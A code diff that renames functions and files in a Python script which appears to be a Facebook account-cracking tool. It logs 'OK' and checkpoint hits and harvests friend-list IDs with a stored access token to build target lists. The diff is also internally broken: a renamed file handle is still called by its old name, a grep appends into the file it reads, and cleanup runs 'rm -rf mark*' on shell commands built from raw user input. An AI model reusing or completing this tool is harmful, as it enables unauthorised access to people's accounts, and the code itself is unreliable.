@@ -138,9 +138,9 @@ def hasil(OK,cp):
 	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mMark Rakib_OK.txt' % (H, P, str(len(ok))))
 	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mmark Rakib_CP.txt' % (H, P, str(len(cp))))
 	    input("\x1b[1;93mPress enter to back mark Rakib Menu ")
-	    sarfraz()
+	    mark()
 
-def sarfraz():
+def mark():
     os.system('clear')
     print(logo)
     ipm = requests.get(url_ip).json()
@@ -151,19 +151,19 @@ def sarfraz():
     print(green +' [2] FILE MAKE')
     print(yellow +' [0] EXIT')
     print('')
-    _sarfraz___ = input(yellow+' [*] Choose option : ')
-    if _sarfraz___ in ('1', '01'):
-        __xxx__().sarfrazx(id)
-    if _sarfraz___ in ('2', '02'):
+    _mark___ = input(yellow+' [*] Choose option : ')
+    if _mark___ in ('1', '01'):
+        __xxx__().mark(id)
+    if _mark___ in ('2', '02'):
     	os.system("python filemake.py")
-    if _sarfraz___ in ('E', 'ee'):
+    if _mark___ in ('E', 'ee'):
         pass
 
 
 class __xxx__:
     def __init__(self):
         self.id = []
-    def sarfrazx(self,id):
+    def markx(self,id):
         os.system("clear")
         print(logo)
         self.cnt = input(yellow+'Put File Name : ')
@@ -176,7 +176,7 @@ class __xxx__:
             self.__pler__()
         else:
             print(' [!] Choose Correct One');
-            self.sarfrazx(id)
+            self.markx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
         sys.stdout.write(f"\r \x1b[1;93m[mark-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
@@ -427,7 +427,7 @@ def auto():
             tfile = open('/sdcard/tokenofl.txt','r').read()
             fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
             qfr = json.loads(fr)
-            temp_save = open('temp.txt', 'a')
+            mark_save = open('mark.txt', 'a')
             for data in qfr['data']:
                 uids = data['id']
                 if uids in nusrat:
@@ -435,7 +435,7 @@ def auto():
                 else:
                     nusrat.append(uids)
                     temp_save.write(uids+'\n')
-            temp_save.close()
+            mark_save.close()
         except KeyError:
             if 'invalid' in str(fr):
                 print('  Logged token has expired ...')
@@ -455,10 +455,10 @@ def auto():
     for links in range(ask_link):
         completed +=1
         li = input('  %s Link start with: '%completed)
-        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
+        os.system('cat mark.txt | grep "'+li+'" >> mark.txt')
     save_file = input('  Save file as: ')
     os.system('clear')
-    lines = open('temp2.txt', 'r').readlines()
+    lines = open('mark.txt', 'r').readlines()
     print(logo)
     print('  Total ids to grab: '+str(len(lines)))
     print('  Grabbing Process has started')
@@ -491,24 +491,24 @@ def auto():
             #print(e)
             if 'invalid' in str(rg):
                 print('  Token has expired, try again ...')
-                os.system('rm -rf temp*')
+                os.system('rm -rf mark*')
                 pass
             else:
                 print('  Grabbed from: '+ids)
                 print('  Friendlist ids: 0')
                 print('  Token status: Live')
                 print("\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
-                os.system('rm -rf temp*')
+                os.system('rm -rf mark*')
                 pass
     lenid = open('/sdcard/'+save_file, 'r').readlines()
     print('  Grabbing Process has completed ')
-    os.system('rm -rf temp*')
+    os.system('rm -rf mark*')
     print('  Total ids grabbed: '+str(len(lenid)))
     print('  File saved as: /sdcard/'+save_file)
     print("\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
     input('  Press enter to back ')
-    safraz()
+    mark()
     
     
     
-sarfraz()
+mark()
